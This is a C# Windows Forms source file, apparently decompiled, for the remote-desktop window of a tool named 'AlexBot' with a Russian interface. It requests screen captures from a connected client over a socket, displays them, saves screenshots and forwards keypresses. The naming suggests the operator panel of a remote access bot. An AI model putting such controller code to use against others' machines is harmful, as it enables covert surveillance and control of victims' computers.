using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace AlexBot
{
	public class RemoteDesktop : Form
	{
		public Socket selected;

		public ToolSocket tsock;

		public bool View = false;

		private Thread t;

		private IContainer components = null;

		private PictureBox pictureBox1;

		private StatusStrip statusStrip1;

		private ToolStripSplitButton toolStripSplitButton1;

		private ToolStripMenuItem toolStripMenuItem_0;

		private SaveFileDialog saveFileDialog1;

		private CheckBox checkBox1;

		private CheckBox checkBox2;

		public RemoteDesktop()
		{
			InitializeComponent();
		}

		public Bitmap ByteToImage(byte[] blob)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(blob, 0, Convert.ToInt32(blob.Length));
				Bitmap result = new Bitmap(memoryStream, useIcm: false);
				memoryStream.Dispose();
				return result;
			}
			catch (Exception)
			{
				View = false;
				Close();
				return null;
			}
		}

		public void UpdateRemoteDesktop()
		{
			byte[] array = new byte[2073600];
			try
			{
				while (View)
				{
					Thread.Sleep(500);
					tsock.sendCommand(selected, "desktop.getView", "1");
					int bytes = selected.Receive(array);
					tsock.UpdateTraffic(selected, bytes, "read");
					Bitmap bitmap = ByteToImage(array);
					if (bitmap != null)
					{
						Action action = delegate
						{
							pictureBox1.Image = bitmap;
						};
						if (base.InvokeRequired)
						{
							Invoke(action);
						}
						else
						{
							action();
						}
						action = delegate
						{
							MaximumSize = pictureBox1.Size;
						};
						if (base.InvokeRequired)
						{
							Invoke(action);
						}
						else
						{
							action();
						}
					}
				}
			}
			catch (Exception)
			{
				StartRemoteView();
			}
		}

		public void StartRemoteView()
		{
			t = new Thread(UpdateRemoteDesktop);
			t.IsBackground = true;
			t.Start();
		}

		private void RemoteDesktopLoad(object sender, EventArgs e)
		{
			StartRemoteView();
		}

		private void ToolStripSplitButton1ButtonClick(object sender, EventArgs e)
		{
			if (View)
			{
				toolStripSplitButton1.Text = "Запустить";
				View = false;
			}
			else
			{
				toolStripSplitButton1.Text = "Остановить";
				View = true;
				StartRemoteView();
			}
		}

		private void toolStripMenuItem_0_Click(object sender, EventArgs e)
		{
			try
			{
				saveFileDialog1.ShowDialog();
				pictureBox1.Image.Save(saveFileDialog1.FileName);
			}
			catch (Exception)
			{
				MessageBox.Show("Не удалось сохранить скриншот.", "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void RemoteDesktopKeyPress(object sender, KeyPressEventArgs e)
		{
			char keyChar = e.KeyChar;
			tsock.sendCommand(selected, "key.press", char.ToString(keyChar));
		}

		private void RemoteDesktopFormClosing(object sender, FormClosingEventArgs e)
		{
			t.Abort();
			View = false;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AlexBot.RemoteDesktop));
			pictureBox1 = new System.Windows.Forms.PictureBox();
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			toolStripSplitButton1 = new System.Windows.Forms.ToolStripSplitButton();
			toolStripMenuItem_0 = new System.Windows.Forms.ToolStripMenuItem();
			saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
			checkBox1 = new System.Windows.Forms.CheckBox();
			checkBox2 = new System.Windows.Forms.CheckBox();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			statusStrip1.SuspendLayout();
			SuspendLayout();
			pictureBox1.Location = new System.Drawing.Point(0, 0);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(521, 369);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			statusStrip1.Dock = System.Windows.Forms.DockStyle.Top;
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1]
			{
				toolStripSplitButton1
			});
			statusStrip1.Location = new System.Drawing.Point(0, 0);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Size = new System.Drawing.Size(554, 22);
			statusStrip1.TabIndex = 1;
			statusStrip1.Text = "statusStrip1";
			toolStripSplitButton1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
			toolStripSplitButton1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			toolStripSplitButton1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1]
			{
				toolStripMenuItem_0
			});
			toolStripSplitButton1.Image = (System.Drawing.Image)resources.GetObject("toolStripSplitButton1.Image");
			toolStripSplitButton1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
			toolStripSplitButton1.ImageTransparentColor = System.Drawing.Color.Magenta;
			toolStripSplitButton1.Name = "toolStripSplitButton1";
			toolStripSplitButton1.Size = new System.Drawing.Size(78, 20);
			toolStripSplitButton1.Text = "Запустить";
			toolStripSplitButton1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
			toolStripSplitButton1.TextImageRelation = System.Windows.Forms.TextImageRelation.Overlay;
			toolStripSplitButton1.ButtonClick += new System.EventHandler(ToolStripSplitButton1ButtonClick);
			toolStripMenuItem_0.Name = "сохранитьСкриншотToolStripMenuItem";
			toolStripMenuItem_0.Size = new System.Drawing.Size(191, 22);
			toolStripMenuItem_0.Text = "Сохранить скриншот";
			toolStripMenuItem_0.Click += new System.EventHandler(toolStripMenuItem_0_Click);
			checkBox1.Location = new System.Drawing.Point(102, 2);
			checkBox1.Name = "checkBox1";
			checkBox1.Size = new System.Drawing.Size(163, 24);
			checkBox1.TabIndex = 2;
			checkBox1.Text = "Использовать мышь";
			checkBox1.UseVisualStyleBackColor = true;
			checkBox2.Location = new System.Drawing.Point(237, 2);
			checkBox2.Name = "checkBox2";
			checkBox2.Size = new System.Drawing.Size(163, 24);
			checkBox2.TabIndex = 3;
			checkBox2.Text = "Использовать клавиатуру";
			checkBox2.UseVisualStyleBackColor = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			AutoScroll = true;
			base.ClientSize = new System.Drawing.Size(554, 383);
			base.Controls.Add(checkBox2);
			base.Controls.Add(checkBox1);
			base.Controls.Add(statusStrip1);
			base.Controls.Add(pictureBox1);
			base.Name = "RemoteDesktop";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Удалённый рабочий стол";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(RemoteDesktopFormClosing);
			base.Load += new System.EventHandler(RemoteDesktopLoad);
			base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(RemoteDesktopKeyPress);
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
